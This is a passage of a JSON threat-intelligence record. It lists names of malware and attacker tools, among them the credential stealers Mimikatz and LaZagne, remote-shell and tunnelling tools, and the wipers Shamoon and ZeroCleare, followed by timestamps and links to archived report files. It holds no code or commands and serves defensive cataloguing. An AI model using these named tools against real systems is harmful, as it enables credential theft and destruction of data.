                "GREYSTUFF",
                "GoogleDrive RAT",
                "HighShell",
                "HyperShell",
                "ISMAgent",
                "ISMDoor",
                "ISMInjector",
                "Jason",
                "Karkoff",
                "LIONTAIL",
                "LOLBAS",
                "LOLBins",
                "LONGWATCH",
                "LaZagne",
                "Living off the Land",
                "MailDropper",
                "Mimikatz",
                "MrPerfectInstaller",
                "OILYFACE",
                "OopsIE",
                "POWBAT",
                "POWRUNER",
                "Plink",
                "Poison Frog",
                "PowerExchange",
                "PsList",
                "PuTTY Link",
                "QUADAGENT",
                "RDAT",
                "RGDoor",
                "SEASHARPEE",
                "Saitama",
                "Saitama Backdoor",
                "Shamoon",
                "SideTwist",
                "SpyNote",
                "SpyNote RAT",
                "StoneDrill",
                "TONEDEAF",
                "TONEDEAF 2.0",
                "ThreeDollars",
                "TwoFace",
                "VALUEVAULT",
                "Webmask",
                "WinRAR",
                "ZEROCLEAR",
                "ZeroCleare",
                "certutil",
                "certutil.exe"
            ],
            "source_id": "ETDA",
            "reports": null
        }
    ],
    "ts_created_at": 1666716493,
    "ts_updated_at": 1743041847,
    "ts_creation_date": 1534246290,
    "ts_modification_date": 1534246291,
    "files": {
        "pdf": "https://archive.orkl.eu/f2709b82b355ec9d5afedbba14e7f8e3f540c582.pdf",
        "text": "https://archive.orkl.eu/f2709b82b355ec9d5afedbba14e7f8e3f540c582.txt",
        "img": "https://archive.orkl.eu/f2709b82b355ec9d5afedbba14e7f8e3f540c582.jpg"
    }
}